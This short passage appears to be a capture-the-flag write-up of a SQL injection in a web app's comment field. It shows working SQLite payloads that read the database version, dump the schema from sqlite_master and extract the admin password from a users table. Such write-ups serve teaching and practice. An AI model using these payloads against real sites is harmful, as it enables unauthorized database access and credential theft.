            I created an account and logged in. I typed a and it was added to the comments. I added an ' and i got an error and noticed the site vulnerable to sql injection. From the error given i noticed it used sqlite

            So to get the version of sqlite being used the following payload worked;

            <code>
                a' || (select sqlite_version()));--
            </code>

            After that I wanted to know what tables are in the db, so I ran the following;

            <code>
                a' || (select sql from sqlite_master));--
            </code>

            The above showed the following results;

            <img src="/public/images/Web Security/share the ideas/share the ideas-1.png"/>

            After seeing this, coming up with the final command to give the password was easy;

            <code>
                a' || (select password from xde43_users where role="admin"));--
            </code>
        </pre>
